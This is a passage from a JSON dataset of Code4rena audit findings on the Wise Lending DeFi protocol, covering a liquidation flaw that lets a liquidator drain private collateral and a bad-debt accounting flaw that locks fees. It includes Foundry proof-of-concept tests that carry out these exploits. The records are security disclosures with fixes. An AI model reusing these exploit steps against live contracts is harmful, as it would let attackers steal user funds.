FIVTY_PERCENT\n                / PRECISION_FACTOR_E18;\n```\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32#issuecomment-2004563704):**\n > While this is marked as High, we would like to bring this to a Medium, as there is still a way to liquidate such nft/user should that even occur (depending if there's AavePool present etc).\n> \n> @vonMangoldt can provide details on how this can be mitigated and user can still be liquidated even if they would have a chance to enter with the wrong `isAave` flag.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32#issuecomment-2082901877):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n \n",
      "summary": "\nBug Summary:\n\nThe `keyId` used to determine if a position is an Aave position is incorrect, causing issues with calculating debt ratios and liquidation. This can be fixed by checking the `keyId` instead of the `nftId` in several places in the code. The impact of this bug includes the inability to manually pay back borrowed tokens and the possibility of malicious users creating positions that cannot be liquidated. The bug has been mitigated in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32",
      "tags": [],
      "finders": [
        "0xStalin",
        "nonseodion"
      ]
    },
    {
      "id": "32088",
      "title": "[H-04] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position",
      "impact": "HIGH",
      "content": "\nWhen a user deposits in the `WiseLending` contract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.\n\nWhen a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call to `getFullCollateralETH()` below only the private collateral is returned immediately as full collateral if it is uncollateralized.\n\n[WiseSecurityHelper.sol#L198-L208](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L198C1-L208C10)\n\n```solidity\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n  ❌     if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n```\n\nIn a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. The `calculateWishPercentage()` call calculates this percentage.\n\n[WiseSecurityHelper.sol#L760-L786](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L760-L786)\n\n```solidity\n    function calculateWishPercentage( uint256 _nftId, address _receiveToken, uint256 _paybackETH, uint256 _maxFeeETH, uint256 _baseRewardLiquidation\n    ) external view returns (uint256)\n    {\n        uint256 feeETH = _checkMaxFee(\n            _paybackETH,\n            _baseRewardLiquidation,\n            _maxFeeETH\n        );\n\n        uint256 numerator = (feeETH + _paybackETH)\n            * PRECISION_FACTOR_E18;\n\n        uint256 denominator = getFullCollateralETH(\n            _nftId,\n            _receiveToken\n        );\n\n        return numerator / denominator + 1;\n    }\n```\n\nThe amount to be liquidated, i.e. the amount the liquidator receives, is calculated in [`_calculateReceiveAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L543) using the percentage from `calculateWishPercentage()` and applied to the position's pure collateral first in line 557 below.\n\nIt calculates the percentage of the user's normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e. `potentialPureExtraCashout`, is greater than zero and less than the current private balance (`pureCollateral`) in line 576, it is reduced from the private balance.\n\n[WiseCore.sol#L564-L586](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L564C1-L586C10)\n\n```solidity\n556:         if (pureCollateralAmount[_nftId][_receiveTokens] > 0) {\n557:             receiveAmount = _withdrawPureCollateralLiquidation(\n558:                 _nftId,\n559:                 _receiveTokens,\n560:                 _removePercentage\n561:             );\n562:         }\n563: \n564:         uint256 potentialPureExtraCashout;\n565:         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;\n566:         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];\n567: \n568:         if (pureCollateral > 0 && userShares > 0) {\n569:             potentialPureExtraCashout = _calculatePotentialPureExtraCashout(\n570:                 userShares,\n571:                 _receiveTokens,\n572:                 _removePercentage\n573:             );\n574:         }\n575: \n576:         if (potentialPureExtraCashout > 0 && potentialPureExtraCashout <= pureCollateral) {\n577:             _decreasePositionMappingValue(\n578:                 pureCollateralAmount,\n579:                 _nftId,\n580:                 _receiveTokens,\n581:                 potentialPureExtraCashout\n582:             );\n583: \n584:             _decreaseTotalBareToken(\n585:                 _receiveTokens,\n586:                 potentialPureExtraCashout\n587:             );\n588: \n589:             return receiveAmount + potentialPureExtraCashout;\n590:         }\n591: \n```\n\nThe issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.\n\nHere's how a malicious liquidator can profit and steal user funds:\n\n1. User deposits `$100` worth of WETH in his private balance and `$100` worth of WETH in his normal balance.\n2. He uncollateralizes his position and borrows `$70` worth of WBTC.\n3. If the price of WBTC he borrowed goes up to `$100`, he can be liquidated.\n4. Assuming no liquidation fees, the liquidator pays `$50` WBTC to liquidate `$50` WETH (50%) from the user's private balance leaving `$50`.\n5. The 50% is applied to the user's public balance giving `$50`. This is also deducted from the private balance leaving `$0` in the private balance.\n6. The liquidator ends up paying only `$50` to earn `$50` extra.\n\nA liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol's bad debt increases.\n\n### Impact\n\nThis vulnerability allows the liquidator to steal the user's balance and pay for only a portion of the shares. It has these effects:\n\n1. The user loses funds.\n2. The amount of bad debt in the protocol is increased.\n\n### Proof of Concept\n\nThe `testStealPureBalance()` test below shows a liquidator earning more than the amount he paid for liquidation.\nThe test can be put in any test file in the [contracts](https://github.com/code-423n4/2024-02-wise-lending/tree/main/contracts) directory and ran there.\n\n<details>\n\n```solidity\npragma solidity =0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {WiseLending, PoolManager} from \"./WiseLending.sol\";\nimport {TesterWiseOracleHub} from \"./WiseOracleHub/TesterWiseOracleHub.sol\";\nimport {PositionNFTs} from \"./PositionNFTs.sol\";\nimport {WiseSecurity} from \"./WiseSecurity/WiseSecurity.sol\";\nimport {AaveHub} from \"./WrapperHub/AaveHub.sol\";\nimport {Token} from \"./Token.sol\";\nimport {TesterChainlink} from \"./TesterChainlink.sol\";\n\nimport {IPriceFeed} from \"./InterfaceHub/IPriceFeed.sol\";\nimport {IERC20} from \"./InterfaceHub/IERC20.sol\";\nimport {IWiseLending} from \"./InterfaceHub/IWiseLending.sol\";\n\nimport {ContractLibrary} from \"./PowerFarms/PendlePowerFarmController/ContractLibrary.sol\";\n\ncontract WiseLendingTest is Test, ContractLibrary {\n\n  WiseLending wiseLending;\n  TesterWiseOracleHub oracleHub;\n  PositionNFTs positionNFTs;\n  WiseSecurity wiseSecurity;\n  AaveHub aaveHub;\n  TesterChainlink wbtcOracle;\n\n  // users/admin\n  address alice = address(1);\n  address bob = address(2);\n  address charles = address(3);\n  address lendingMaster;\n\n  //tokens\n  address wbtc;\n\n  function setUp() public {\n    lendingMaster = address(11);\n    vm.startPrank(lendingMaster);\n\n    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;\n    address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;\n    \n    // deploy oracle hub\n    oracleHub = new TesterWiseOracleHub(\n      WETH,\n      ETH_PRICE_FEED,\n      UNISWAP_V3_FACTORY\n    );\n    oracleHub.setHeartBeat(\n      oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat\n      1\n    );\n\n    // deploy position NFT\n    positionNFTs = new PositionNFTs(\n        \"PositionsNFTs\",\n        \"POSNFTS\",\n        \"app.wisetoken.net/json-data/nft-data/\"\n    );\n\n    // deploy Wiselending contract\n    wiseLending = new WiseLending(\n      lendingMaster,\n      address(oracleHub),\n      address(positionNFTs)\n    );\n\n    // deploy AaveHub\n    aaveHub = new AaveHub(\n      lendingMaster,\n      AAVE_ADDRESS,\n      address(wiseLending)\n    );\n    \n    // deploy Wisesecurity contract\n    wiseSecurity = new WiseSecurity(\n      lendingMaster,\n      address(wiseLending),\n      address(aaveHub)\n    );\n\n    wiseLending.setSecurity(address(wiseSecurity));\n    // set labels\n    vm.label(address(wiseLending), \"WiseLending\");\n    vm.label(address(positionNFTs), \"PositionNFTs\");\n    vm.label(address(oracleHub), \"OracleHub\");\n    vm.label(address(wiseSecurity), \"WiseSecurity\");\n    vm.label(alice, \"Alice\");\n    vm.label(bob, \"Bob\");\n    vm.label(charles, \"Charles\");\n    vm.label(wbtc, \"WBTC\");\n    vm.label(WETH, \"WETH\");\n\n    // create tokens, create TestChainlink oracle, add to oracleHub\n    (wbtc, wbtcOracle) = _setupToken(18, 17 ether);\n    oracleHub.setHeartBeat(wbtc, 1);\n    wbtcOracle.setRoundData(0, block.timestamp -1);\n    // setup WETH on oracle hub\n    oracleHub.setHeartBeat(WETH, 60 minutes);\n    oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));\n    \n    // create pools\n    wiseLending.createPool(\n      PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: wbtc, // btc\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 805000000000000000,\n        maxDepositAmount: 1800000000000000000000000\n      })\n    );\n\n    wiseLending.createPool(\n      PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: WETH, // btc\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 805000000000000000,\n        maxDepositAmount: 1800000000000000000000000\n      })\n    );\n  }\n\n  function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {\n    Token _token = new Token(uint8(decimals), alice); // deploy token\n    TesterChainlink _oracle = new TesterChainlink( // deploy oracle\n      value, 18\n    ); \n    oracleHub.addOracle( // add oracle to oracle hub\n      address(_token), \n      IPriceFeed(address(_oracle)), \n      new address[](0)\n    );\n\n    return (address(_token), _oracle);\n  }\n\n  function testStealPureBalance() public {\n    // deposit WETH in private and public balances for Alice's NFT\n    vm.startPrank(alice);\n    deal(WETH, alice, 100 ether);\n    IERC20(WETH).approve(address(wiseLending), 100 ether);\n    uint aliceNft = positionNFTs.reservePosition();\n    wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);\n    wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);\n    \n    // deposit for Bob's NFT to provide WBTC liquidity\n    vm.startPrank(bob);\n    deal(wbtc, bob, 100 ether);\n    IERC20(wbtc).approve(address(wiseLending), 100 ether);\n    wiseLending.depositExactAmountMint(wbtc, 100 ether);\n\n    // Uncollateralize Alice's NFT position to allow only private(pure)\n    // balance to be used as collateral\n    vm.startPrank(alice);\n    wiseLending.unCollateralizeDeposit(aliceNft, WETH);\n    (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);\n    uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;\n    \n    // alice borrows\n    uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;\n    uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);\n\n    vm.startPrank(lendingMaster);\n    // increase the price of WBTC to make Alice's position liquidatable\n    wbtcOracle.setValue(20 ether); \n    \n    // let charles get WBTC to liquidate Alice\n    vm.startPrank(charles);\n    uint charlesNft  = positionNFTs.reservePosition();\n    uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);\n    deal(wbtc, charles, paybackAmount);\n    IERC20(wbtc).approve(address(wiseLending), paybackAmount);\n\n    uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);\n    uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);\n    // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice\n    wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);\n\n    uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);\n    uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;\n    \n    // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)\n    // WBTC paid plus fees = 110% * wbtcBalanceChange\n    // x2WBTCChangePlusFees = 2 * WBTC paid plus fees\n    uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;\n    \n    assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);\n  }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nTo ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the `_calculateReceiveAmount()` function. We can fix it by moving the check.\n\n[WiseCore.sol#L560-L594](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L560C17-L594)\n\n```solidity\n \n+        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {\n+            return receiveAmount;\n+        }\n+\n         uint256 potentialPureExtraCashout;\n         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;\n         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];\n         \n         ...\n\n \n-        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {\n-            return receiveAmount;\n-        }\n-\n         return _withdrawOrAllocateSharesLiquidation(\n             _nftId,\n             _nftIdLiquidator,\n```\n\n### Assessed type\n\nInvalid Validation\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2018540660):**\n > Edge case - if user is about to be liquidated, I think they will make things collateralized to avoid liquidation. Either way we would like to see this as Medium. Fix is already applied. This is also something that's been explored in the hats.finance competition; hence, 564-566 lines came from there etc.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2021005286):**\n > High is appropriate, especially with the PoC demonstrated.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2082900496):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the WiseLending contract. Users can make deposits in this contract and have the option to make a private deposit, which is not used as collateral, or a normal deposit, which can be used as collateral. They can also choose to have their position collateralized or uncollateralized. However, there is an issue where if a user uncollateralizes their position, only their private deposit is returned as collateral. This means that if their position becomes liquidatable, their private deposit may not be enough to cover the amount borrowed. This can lead to a liquidator being able to steal the user's funds by only paying for a portion of the shares. This vulnerability has been fixed, but it was rated as high severity due to the potential impact on user funds and the protocol's bad debt. A proof of concept was also demonstrated to show how a malicious liquidator could exploit this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33",
      "tags": [],
      "finders": [
        "nonseodion"
      ]
    },
    {
      "id": "32087",
      "title": "[H-03] Incorrect bad debt accounting can lead to a state where the `claimFeesBeneficial` function is permanently bricked and no new incentives can be distributed, potentially locking pending and future protocol fees in the `FeeManager` contract",
      "impact": "HIGH",
      "content": "\nProtocol fees can be collected from the `WiseLending` contract and sent to the `FeeManager` contract via the permissionless `FeeManager::claimWiseFees` function. During this call, incentives will only be distributed for `incentive owners` if `totalBadDebtETH` (global bad debt) is equal to `0`:\n\n[`FeeManager::claimWiseFees`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L663-L670)\n\n```solidity\n663:        if (totalBadDebtETH == 0) { // @audit: incentives only distributed if there is no global bad debt\n664:\n665:            tokenAmount = _distributeIncentives( // @audit: distributes incentives for `incentive owners` via `gatheredIncentiveToken` mapping\n666:                tokenAmount,\n667:                _poolToken,\n668:                underlyingTokenAddress\n669:            );\n670:        }\n```\n\nThe fees sent to the `FeeManager` are then able to be claimed by `beneficials` via the `FeeManager::claimFeesBeneficial` function or by `incentive owners` via the `FeeManager::claimIncentives` function (if incentives have been distributed to the owners):\n\n[`FeeManager::claimIncentives`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L284-L293)\n\n```solidity\n284:    function claimIncentives(\n285:        address _feeToken\n286:    )\n287:        public\n288:    {\n289:        uint256 amount = gatheredIncentiveToken[msg.sender][_feeToken]; // @audit: mapping incremented in _distributeIncentives function\n290:\n291:        if (amount == 0) {\n292:            revert NoIncentive();\n293:        }\n```\n\nHowever, `beneficials` are only able to claim fees if there is currently no global bad debt in the system (`totalBadDebtETH == 0`).\n\n[`FeeManager::claimFeesBeneficial`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L689-L699)\n\n```solidity\n689:    function claimFeesBeneficial(\n690:        address _feeToken,\n691:        uint256 _amount\n692:    )\n693:        external\n694:    {\n695:        address caller = msg.sender;\n696:\n697:        if (totalBadDebtETH > 0) { // @audit: can't claim fees when there is bad debt\n698:            revert ExistingBadDebt();\n699:        }\n```\n\nBelow I will explain how the bad debt accounting logic used during partial liquidations can result in a state where `totalBadDebtETH` is permanently greater than `0`. When this occurs, `beneficials` will no longer be able to claim fees via the `FeeManager::claimFeesBeneficial` function and new incentives will no longer be distributed when fees are permissionlessly collected via the `FeeManager::claimWiseFees` function.\n\nWhen a position is partially liquidated, the `WiseSecurity::checkBadDebtLiquidation` function is executed to check if the position has created bad debt, i.e. if the position's overall borrow value is greater than the overall (unweighted) collateral value. If the post liquidation state of the position created bad debt, then the bad debt is recorded in a global and position-specific state:\n\n[`WiseSecurity::checkBadDebtLiquidation`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L405-L436)\n\n```solidity\n405:    function checkBadDebtLiquidation(\n406:        uint256 _nftId\n407:    )\n408:        external\n409:        onlyWiseLending\n410:    {\n411:        uint256 bareCollateral = overallETHCollateralsBare(\n412:            _nftId\n413:        );\n414:\n415:        uint256 totalBorrow = overallETHBorrowBare(\n416:            _nftId\n417:        );\n418:\n419:        if (totalBorrow < bareCollateral) { // @audit: LTV < 100%\n420:            return;\n421:        }\n422:\n423:        unchecked {\n424:            uint256 diff = totalBorrow\n425:                - bareCollateral;\n426:\n427:            FEE_MANAGER.increaseTotalBadDebtLiquidation( // @audit: global state, totalBadDebtETH += diff\n428:                diff\n429:            );\n430:\n431:            FEE_MANAGER.setBadDebtUserLiquidation( // @audit: position state, badDebtPosition[_nftId] = diff\n432:                _nftId,\n433:                diff\n434:            );\n435:        }\n436:    }\n```\n\n[`FeeManagerHeper.sol`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L77-L94)\n\n```solidity\n77:    function _setBadDebtPosition(\n78:        uint256 _nftId,\n79:        uint256 _amount\n80:    )\n81:        internal\n82:    {\n83:        badDebtPosition[_nftId] = _amount; // @audit: position bad debt set\n84:    }\n85:\n86:    /**\n87:     * @dev Internal increase function for global bad debt amount.\n88:     */\n89:    function _increaseTotalBadDebt(\n90:        uint256 _amount\n91:    )\n92:        internal\n93:    {\n94:        totalBadDebtETH += _amount; // @audit: total bad debt incremented\n```\n\nAs we can see above, the method by which the global and position's state is updated is not consistent (total debt increases, but position's debt is set to recent debt). Since liquidations can be partial, a position with bad debt can undergo multiple partial liquidations and each time the `totalBadDebtETH` will be incremented. However, the `badDebtPosition` for the position will only be updated with the most recent bad debt that was recorded during the last partial liquidation. Note that due to the condition on line 419 of `WiseSecurity::checkBadDebtLiquidation`, the `badDebtPosition` will be reset to `0` when `totalBorrow == bareCollateral` (`LTV == 100%`). However, in this case, any previously recorded bad debt for the position will *not* be deducted from the `totalBadDebtETH`. Lets consider two examples:\n\n**Scenario 1**: Due to a market crash, a position's LTV goes above 100%. The position gets partially liquidated, incrementing `totalBadDebtETH` by `x` (bad debt from 1st liquidation) and setting `badDebtPosition[_nftId]` to `x`. The position gets partially liquidated again, this time incrementing `totalBadDebtETH` by `y` (bad debt from 2nd liquidation) and setting `badDebtPosition[_nftId]` to `y`. The resulting state:\n\n```\ntotalBadDebtETH == x + y\nbadDebtPosition[_nftId] == y\n```\n\n**Scenario 2**: Due to a market crash, a position's LTV goes above 100%. The position gets partially liquidated, incrementing `totalBadDebtETH` by `x` and setting `badDebtPosition[_nftId]` to `x`. The position gets partially liquidated again, but this time the `totalBorrow` is equal to `bareCollateral` (`LTV == 100%`) and thus no bad debt is created. Due to the condition on line 419, `totalBadDebtETH` will be incremented by `0`, but `badDebtPosition[_nftId]` will be reset to `0`. The resulting state:\n\n```\ntotalBadDebtETH == x\nbadDebtPosition[_nftId] == 0\n```\n\nNote: Scenario 1 is more likely to occur since Scenario 2 requires the additional partial liquidation to result in an LTV of exactly 100% for the position.\n\nAs we can see, partial liquidations can lead to `totalBadDebtETH` being artificially inflated with respect to the actual bad debt created by a position.\n\nWhen bad debt is created, it is able to be paid back via the [`FeeManager::paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L730-L744) or [`FeeManager::paybackBadDebtNoReward`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L816-L826) functions. However, the maximum amount of bad debt that can be deducted during these calls is capped at the bad debt recorded for the position specified (`badDebtPosition[_nftId]`). Therefore, the excess \"fake\" bad debt can not be deducted from `totalBadDebtETH`, resulting in `totalBadDebtETH` being permanently greater than `0`.\n\nBelow is the logic that deducts the bad debt created by a position when it is paid off via one of the payback functions mentioned above:\n\n[`FeeManagerHelper::_updateUserBadDebt`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L170-L181)\n\n```solidity\n170:        unchecked {\n171:            uint256 newBadDebt = currentBorrowETH\n172:                - currentCollateralBareETH;\n173:\n174:            _setBadDebtPosition( // @audit: badDebtPosition[_nftId] = newBadDebt\n175:                _nftId,\n176:                newBadDebt\n177:            );\n178:\n179:            newBadDebt > currentBadDebt // @audit: totalBadDebtETH updated with respect to change in badDebtPosition\n180:                ? _increaseTotalBadDebt(newBadDebt - currentBadDebt)\n181:                : _decreaseTotalBadDebt(currentBadDebt - newBadDebt);\n```\n\nThe above code is invoked in the [`FeeManagerHelper::updatePositionCurrentBadDebt`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L270-L285) function, which is in turn invoked during both of the payback functions previously mentioned. You will notice that the above code properly takes into account the change in the bad debt of the position in question. I.e. if the `badDebtPosition[_nftId]` decreased (after being paid back), then the `totalBadDebtETH` will decrease as well. Therefore, the `totalBadDebtETH` can only be deducted by at most the current bad debt of a position. Returning to the previous example in Scenario 1, this means that `totalBadDebtETH` would remain equal to `x`, since only `y` amount of bad debt can be paid back.\n\n### Impact\n\nIn the event a position creates bad debt, partial liquidations of that position can lead to the global `totalBadDebtETH` state variable being artificially inflated. This additional \"fake debt\" can not be deducted from the global state when the actual bad debt of the position is paid back. Thus, the `FeeManager::claimFeesBeneficial` function will be permanently DOS-ed, preventing any `beneficials` from claiming fees in the `FeeManager` contract. Additionally, no new incentives are able to be distributed to `incentive owners` in this state. However, protocol fees can still be collected in this state via the permissionless `FeeManager::claimWiseFees` function, and since `incentive owners` and `beneficials` are the only entities able to claim these fees, this can lead to fees being permanently locked in the `FeeManager` contract.\n\n### Justification for Medium Severity\n\nAlthough not directly affecting end users, the function of claiming beneficial fees and distributing new incentives will be permanently bricked. To make matters worse, anyone can continue to collect fees via the permissionless `FeeManager::claimWiseFees` function, which will essentially \"burn\" any pending or future fees by locking them in the `FeeManager` (assuming all previously gathered incentives have been claimed). This value is, therefore, leaked from the protocol every time additional fees are collected in this state.\n\nOnce this state is reached, any pending or future fees should ideally be left in the `WiseLending` contract, providing value back to the users instead of allowing that value to be unnecessarily \"burned\". However, the permissionless nature of the `FeeManager::claimWiseFees` function allows bad actors to further grief the protocol during this state by continuing to collect fees.\n\nNote: Once this state is reached, and `WiseLending` is made aware of the implications, all fees (for all pools) can be set to `0` by the `master` address. This would ensure that no future fees are sent to the `FeeManager`. However, this does not stop pending fees from being collected. Additionally, a true decentralized system (such as a DAO) would likely have some latency between proposing such a change (decreasing fee value) and executing that change. Therefore, any fees distributed during that period can be collected.\n\n### Proof of Concept\n\nPlace the following test in the `contracts/` directory and run with `forge test --match-path contracts/BadDebtTest.t.sol`:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./WiseLendingBaseDeployment.t.sol\";\n\ncontract BadDebtTest is BaseDeploymentTest {\n    address borrower = address(0x01010101);\n    address lender = address(0x02020202);\n\n    uint256 depositAmountETH = 10e18; // 10 ether\n    uint256 depositAmountToken = 10; // 10 ether\n    uint256 borrowAmount = 5e18; // 5 ether\n\n    uint256 nftIdLiquidator; // nftId of lender\n    uint256 nftIdLiquidatee; // nftId of borrower\n\n    uint256 debtShares;\n\n    function _setupIndividualTest() internal override {\n        _deployNewWiseLending(false);\n\n        // set token value for simple calculations\n        MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH\n        assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());\n        vm.stopPrank();\n        \n        // fund lender and borrower\n        vm.deal(lender, depositAmountETH);\n        deal(address(MOCK_WETH), lender, depositAmountETH);\n        deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);\n    }\n\n\n    function testScenario1() public {\n        // --- scenario is set up --- //\n        _setUpScenario();\n\n        // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //\n        _marketCrashCreatesBadDebt();\n\n        // --- borrower gets partially liquidated again --- //\n        vm.prank(lender);\n\n        LENDING_INSTANCE.liquidatePartiallyFromTokens(\n            nftIdLiquidatee,\n            nftIdLiquidator, \n            address(MOCK_WETH),\n            address(MOCK_ERC20_2),\n            debtShares * 2e16 / 1e18\n        );\n\n        // --- global bad det increases again, but user bad debt is set to current bad debt created --- // \n        uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n        uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n        \n        assertGt(newUserBadDebt, 0); // userBadDebt reset to new bad debt, newUserBadDebt == current_bad_debt_created\n        assertGt(newTotalBadDebt, newUserBadDebt); // global bad debt incremented again\n        // newTotalBadDebt = old_global_bad_debt + current_bad_debt_created\n        \n        // --- user bad debt is paid off, but global bad is only partially paid off (remainder is fake debt) --- // \n        _tryToPayBackGlobalDebt();\n\n        // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- // \n        vm.expectRevert(bytes4(keccak256(\"ExistingBadDebt()\")));\n        FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);\n    }\n\n    function testScenario2() public {\n        // --- scenario is set up --- // \n        _setUpScenario();\n\n        // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //\n        _marketCrashCreatesBadDebt();\n        \n        // --- Position manipulated so second partial liquidation results in totalBorrow == bareCollateral --- //\n        // borrower adds collateral\n        vm.prank(borrower);\n\n        LENDING_INSTANCE.solelyDeposit(\n            nftIdLiquidatee, \n            address(MOCK_ERC20_2), \n            6\n        );\n\n        // borrower gets partially liquidated again\n        vm.prank(lender);\n\n        LENDING_INSTANCE.liquidatePartiallyFromTokens(\n            nftIdLiquidatee,\n            nftIdLiquidator, \n            address(MOCK_WETH),\n            address(MOCK_ERC20_2),\n            debtShares * 2e16 / 1e18\n        );\n        \n        uint256 collateral = SECURITY_INSTANCE.overallETHCollateralsBare(nftIdLiquidatee);\n        uint256 debt = SECURITY_INSTANCE.overallETHBorrowBare(nftIdLiquidatee);\n        assertEq(collateral, debt); // LTV == 100% exactly\n\n        // --- global bad debt is unchanged, while user bad debt is reset to 0 --- // \n        uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n        uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n\n        assertEq(newUserBadDebt, 0); // user bad debt reset to 0\n        assertGt(newTotalBadDebt, 0); // global bad debt stays the same (fake debt)\n\n        // --- attempts to pay back fake global debt result in a noop, totalBadDebtETH still > 0 --- // \n        uint256 paybackShares = _tryToPayBackGlobalDebt();\n        \n        assertEq(LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH)), paybackShares); // no shares were paid back\n\n        // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //\n        vm.expectRevert(bytes4(keccak256(\"ExistingBadDebt()\")));\n        FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);\n    }\n\n    function _setUpScenario() internal {\n        // lender supplies ETH\n        vm.startPrank(lender);\n\n        nftIdLiquidator = 